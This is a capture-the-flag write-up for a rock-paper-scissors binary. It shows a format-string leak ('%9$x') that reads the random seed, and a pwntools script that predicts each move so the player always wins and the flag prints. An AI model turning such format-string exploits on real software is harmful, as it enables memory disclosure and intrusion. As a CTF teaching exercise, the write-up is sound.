We are given a binary:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/245b3e9e-f0dd-4d91-995e-ded40cba28f0)

When run it shows the following:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/2c139dec-9a62-4405-8ff3-a9926c4041b7)

Apparently we can play with the program, and if we win, something interesting might happen.  
Let's take a look at it in ghidra

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/8a4e8c3c-1d57-4c1d-ac13-acb806cf6799)

So, we can see that the program first opens, `/dev/urandom`, and then uses that random number as a seed, for later deciding what to choose when playing.   
If we win at Rock Paper Scissors, the `print_flag`  function will be called. However, we can see on line `27` that there is an unsafe use of `printf()`.  
The main idea of the exploit is that we can read from memory the random seed, and use it to predict every move the program will make to always beat it.  

After trial and error I found the seed to be the 9th argument to printf.  
``` python3
from pwn import *
import ctypes
import warnings
warnings.filterwarnings('ignore', category=BytesWarning)

elf = ELF('./rps')
context.binary = elf
p = process('./rps')
p.sendlineafter(':', r'%9$x')
p.recvuntil('Hi')
seed = int(p.recvline().strip(),16)
log.success(f'Got Seed: {seed}')

libc = ctypes.CDLL('libc.so.6')
libc.srand(seed)
```
Now we can look at the `play_rps` function to use our knowledge of the seed to always win.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/0101418c-7018-4a07-ad26-e3f32a354290)

So, depending on what `rand() % 3` is it chooses `r`, `p`, or `s`. Let's leverage that to play the winning move every time.  
```python3

for i in range(50):
    v = libc.rand() % 3
    if v == 0:
        p.sendlineafter(':','p')
    if v == 1:
        p.sendlineafter(':','s')
    if v == 2:
        p.sendlineafter(':','r')
p.interactive()
```

Final Solve Script:  
```python3
from pwn import *
import ctypes
import warnings
warnings.filterwarnings('ignore', category=BytesWarning)

elf = ELF('./rps')
context.binary = elf
p = process('./rps')
p.sendlineafter(':', r'%9$x')
p.recvuntil('Hi')
seed = int(p.recvline().strip(),16)
log.success(f'Got Seed: {seed}')

libc = ctypes.CDLL('libc.so.6')
libc.srand(seed)

for i in range(50):
    v = libc.rand() % 3
    if v == 0:
        p.sendlineafter(':','p')
    if v == 1:
        p.sendlineafter(':','s')
    if v == 2:
        p.sendlineafter(':','r')
p.interactive()
```
